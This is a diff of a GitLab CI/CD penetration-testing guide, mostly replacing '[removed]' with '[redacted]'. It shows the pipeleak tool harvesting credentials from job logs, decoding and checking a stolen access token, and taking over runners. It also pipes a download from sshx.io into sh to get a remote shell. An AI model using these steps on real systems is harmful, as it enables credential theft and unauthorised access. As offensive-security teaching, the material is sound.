@@ -19,16 +19,17 @@ Sweet now you have access to the GitLab instance with an account.
 The first thing to look out for: What projects do I have access to? Is it more than unauthenticated? 
 Some companies grant their developers `developer` access to each repository, this might become interesting.
 
-The main question: Is the access concept based on the least privilege principle?
-
-> To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens
+> The main question: Is the access concept based on the least privilege principle?
 
 ## Known Vulnerabilities
 
 Usually GitLab does disclose the installed version to auhtenticated users only.
 You can check the version manually at `https://leakycompany.com/help`.
+
 Using [pipeleak](https://github.com/CompassSecurity/pipeleak) we can automate this process and enumerates known vulnerabilities. 
 Make sure to verify manually as well.
+> To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens
+
 ```bash
 pipeleak vuln -g https://leakycompany.com -t glpat-[redacted]
 2024-11-14T14:29:05+01:00 INF GitLab version=17.5.1-ee
@@ -81,9 +82,9 @@ Many problems can arise when misconfiguring these.
 # Example 0
 # Variations of this include e.g. `printenv`, `env` commands etc.
 $ echo $AWS_ACCESS_KEY_ID
-AKI[removed]
+AKI[redacted]
 $ echo $AWS_SECRET_ACCESS_KEY
-[removed]
+[redacted]
 $ echo $S3_BUCKET
 some-bucket-name
 $ aws configure set region us-east-1
@@ -94,24 +95,24 @@ upload: target/myfile to s3://some-bucket-name/myfile
 $ mkdir -p ./creds
 $ echo $GCLOUD_SERVICE_KEY | base64 -d > ./creds/serviceaccount.json
 $ echo $GCLOUD_SERVICE_KEY
-[removed]
+[redacted]
 $ cat ./creds/serviceaccount.json
 {
   "type": "service_account",
-  "project_id": "[removed]",
-  "private_key_id": "[removed]",
-  "private_key": "-----BEGIN PRIVATE KEY-----[removed]-----END PRIVATE KEY-----\n",
-  "client_email": "[removed].iam.gserviceaccount.com",
-  "client_id": "[removed]",
+  "project_id": "[redacted]",
+  "private_key_id": "[redacted]",
+  "private_key": "-----BEGIN PRIVATE KEY-----[redacted]-----END PRIVATE KEY-----\n",
+  "client_email": "[redacted].iam.gserviceaccount.com",
+  "client_id": "[redacted]",
   "auth_uri": "https://accounts.google.com/o/oauth2/auth",
   "token_uri": "https://oauth2.googleapis.com/token",
   "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "[removed]",
+  "client_x509_cert_url": "[redacted]",
   "universe_domain": "googleapis.com"
 }
 $ terraform init
 Initializing the backend...
-Successfully configured the backend "[removed]"! Terraform will automatically
+Successfully configured the backend "[redacted]"! Terraform will automatically
 use this backend unless the backend configuration changes.
 
 # Example 2
@@ -121,14 +122,14 @@ $ eval $(ssh-agent -s)
 Agent pid 13
 $ echo "$PRIVATE_KEY"
 -----BEGIN OPENSSH PRIVATE KEY-----
-[removed]
+[redacted]
 ```
 
 There are many reasons why credentials might be included in the job output. Moreover, it is important to review generated artifacts as well. It is possible that credentials are not logged in the output but later saved in artifacts, that can be downloaded.
 
 **Automating Pipeline Credential Leaks**
 
-[Pipleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
+[Pipeleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
 
 ```bash
 $ pipeleak scan --token glpat-[redacted] --gitlab https://gitlab.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high 
@@ -143,7 +144,7 @@ $ pipeleak scan --token glpat-[redacted] --gitlab https://gitlab.com -c [gitlab 
 2024-09-26T13:47:10+02:00 INF Provided GitLab session cookie is valid
 2024-09-26T13:47:15+02:00 DBG Fetch Project jobs for url=https://gitlab.com/legendaryleo/WebRTC_Source
 2024-09-26T13:47:15+02:00 DBG Fetch Project jobs for url=https://gitlab.com/himanshu8443/fdroiddata
-[removed]
+[redacted]
 ```
 
 Review the findings manually and tweak the flags according to your needs.
@@ -156,7 +157,7 @@ Pipeleak identified the following based64 encode secret in the environment varia
 
 ```bash
 CI_SERVER=yes
-CI_REPO_TOKEN=Z[removed]s=
+CI_REPO_TOKEN=Z[redacted]s=
 FF_SET_PERMISSIONS_BEFORE_CLEANUP=true
 CI_COMMIT_SHORT_SHA=998068b1
 ```
@@ -165,23 +166,23 @@ Decoding it shows that it is a GitLab personal access token, which is valid.
 ```bash
 # Decoding the PAT
 $ base64 -d
-Z[removed]s=
+Z[redacted]s=
 glpat-[remvoed]
 
 # Verify using the API
-curl --request GET --header "PRIVATE-TOKEN: glpat-[removed]" https://gitlab.com/api/v4/user/ | jq
+curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.com/api/v4/user/ | jq
 
 {
-  "id": [removed],
+  "id": [redacted],
   "username": "pipeleak_user",
   "name": "testToken",
   "state": "active",
   "locked": false,
-  [removed]
+  [redacted]
 }
 
 # Verify using Pipeleak
-pipeleak enum -g https://gitlab.com -t glpat-[removed]
+pipeleak enum -g https://gitlab.com -t glpat-[redacted]
 2025-09-29T12:25:51Z INF Enumerating User
 2025-09-29T12:25:51Z WRN Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleak_user
 2025-09-29T12:25:51Z INF Enumerating Access Token
@@ -228,7 +229,7 @@ $ pipeleak runners --token glpat-[redacted] --gitlab https://gitlab.com -v explo
 2024-09-26T14:32:26+02:00 INF ---
 stages:
     - exploit
-pipleak-job-saas-linux-small-amd64:
+pipeleak-job-saas-linux-small-amd64:
     stage: exploit
     image: ubuntu:latest
     before_script:
@@ -248,11 +249,11 @@ pipleak-job-saas-linux-small-amd64:
 2024-09-26T14:32:26+02:00 INF Done, Bye Bye 🏳️‍🌈🔥
 
 # Automated
-$ pipeleak runners --token glpat-[removed]  --gitlab https://gitlab.com -v exploit --tags saas-linux-small-amd64 --shell 
+$ pipeleak runners --token glpat-[redacted]  --gitlab https://gitlab.com -v exploit --tags saas-linux-small-amd64 --shell 
 2024-09-26T14:33:48+02:00 DBG Verbose log output enabled
-2024-09-26T14:33:49+02:00 INF Created project name=pipeleak-runner-exploit url=https://gitlab.com/[removed]/pipeleak-runner-exploit
+2024-09-26T14:33:49+02:00 INF Created project name=pipeleak-runner-exploit url=https://gitlab.com/[redacted]/pipeleak-runner-exploit
 2024-09-26T14:33:50+02:00 INF Created .gitlab-ci.yml file=.gitlab-ci.yml
-2024-09-26T14:33:50+02:00 INF Check pipeline logs manually url=https://gitlab.com/[removed]/pipeleak-runner-exploit/-/pipelines
+2024-09-26T14:33:50+02:00 INF Check pipeline logs manually url=https://gitlab.com/[redacted]/pipeleak-runner-exploit/-/pipelines
 2024-09-26T14:33:50+02:00 INF Make sure to delete the project when done
 2024-09-26T14:33:50+02:00 INF Done, Bye Bye 🏳️‍🌈🔥
 ```
@@ -276,7 +277,7 @@ $ ./deepce.sh
 [+] Another Test ............ Error running check
 [+] Negative Test ........... No
 [+] Multi line test ......... Yes
-[removed]
+[redacted]
 
 $ curl -sSf https://sshx.io/get | sh -s run
 ↯ Downloading sshx from https://s3.amazonaws.com/sshx/sshx-x86_64-unknown-linux-musl.tar.gz
@@ -286,7 +287,7 @@ $ curl -sSf https://sshx.io/get | sh -s run
 ↯ Adding sshx binary to /tmp/tmp.zky0trhv9m
 ↯ Done! You can now run sshx.
   sshx v0.2.5
-  ➜  Link:  https://sshx.io/s/Vg[removed]
+  ➜  Link:  https://sshx.io/s/Vg[redacted]
   ➜  Shell: /bin/bash
 ```
 
